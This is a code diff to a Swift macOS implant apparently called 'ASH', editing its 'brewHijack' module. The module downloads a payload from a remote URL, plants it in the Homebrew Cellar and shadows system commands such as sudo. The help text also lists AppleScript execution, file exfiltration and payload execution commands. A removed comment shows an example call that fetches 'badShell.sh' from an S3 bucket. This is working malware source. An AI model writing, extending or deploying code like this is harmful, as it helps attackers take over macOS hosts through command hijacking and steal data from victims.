@@ -223,8 +223,7 @@ public struct ASH {
                         }
                     }
                 case ("brewHijack;"):
-                    // Format brewHijack; <commandToHijack> <fakeFolderName> <binary> <domainForPayload>
-                    // brewHijack; testShell badShell badShell.sh https://shhhhhellll.s3.us-east-2.amazonaws.com/badShell.sh
+                    // If homebrew is installed on the target host, this module can be used to hijack it. For example, placing sudo in the /usr/local/bin directory will hijack macOS's legit sudo binary in /usr/bin/
                     let commandSplit = command.components(separatedBy: "; ")[safe: 1]
                     let commandHijack = commandSplit?.components(separatedBy: " ")[safe: 0]
                     let fakeFolder = commandSplit?.components(separatedBy: " ")[safe: 1]
@@ -266,17 +265,9 @@ public struct ASH {
                         
                         // Get the payload
                         var request = URLRequest(url: domain!)
-                        
-                        // TODO: Make the method an input
                         request.httpMethod = "GET"
                         
                         let task = URLSession.shared.dataTask(with: request) {(data, response, error) in
-                            // Check and return the error
-                            if let error = error {
-                                print(error)
-                                return
-                            }
-                            
                             fileManager.createFile(atPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!, contents: data)
                             
                             // Modify the payload's permissions
@@ -301,10 +292,10 @@ public struct ASH {
                         }
                         task.resume()
                         
-                        
                         return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: "Command has been hijack").returnDict as NSDictionary
                     }
                     else {
+                        return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: "Homebrew is not installed on the destination host").returnData as! NSDictionary
                     }
                     
                 case ("man;"):
@@ -323,7 +314,7 @@ public struct ASH {
                     osascript; <Code> --- This will run an Apple script.
                     exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
                     execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
-                    brewHijack; <commandToHijack> <fakeFolderName> <domainForPayload> --- This will check to see if Homebrew is installed and hijack the Cellar.
+                    brewHijack; <commandToHijack> <fakeFolderName> <binary> <domainForPayload> --- This will check to see if Homebrew is installed and hijack the Cellar.
                     """
                     return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: commandResult).returnDict as NSDictionary
                 default:
